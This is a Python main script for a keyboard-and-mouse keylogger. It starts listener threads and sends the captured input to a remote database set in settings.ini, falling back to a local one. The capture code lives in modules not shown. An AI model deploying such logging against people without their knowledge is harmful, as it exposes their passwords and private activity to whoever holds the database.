import sys
import signal
from threading import Thread
from configparser import ConfigParser

from utils import ArgParser
from keylogger import Keyboard, Mouse, Logger, action


if __name__ == '__main__':
    args = ArgParser().parse()
    action._type = args.a
    settings = ConfigParser()
    settings.read('settings.ini')
    if args.cs:
        print('Trying to connect to specified database...')
        logger = Logger(db_path=settings['DATABASE'][args.cs])
        print('Connected to specified database.')
    else:
        try:
            print('Establishing remote connection...')
            logger = Logger(db_path=settings['DATABASE']['remote'])
        except Exception as remote:
            print('Remote connection failed due to {}.'.format(remote))
            try:
                print('Establishing local connection...')
                logger = Logger(db_path=settings['DATABASE']['local'])
            except Exception as local:
                print('Local connection failed due to {}.'.format(local))
                sys.exit(0)

    def signal_handler(signal, frame):
        print('Interrupt initialised.')
        logger.finalize()
        logger.session.close()
        print('Database session closed.')
        print('Exit.')
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    mouse_listener = Mouse(logger)
    keyboard_listener = Keyboard(logger)
    threads = [Thread(target=keyboard_listener.listen),
               Thread(target=mouse_listener.listen)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
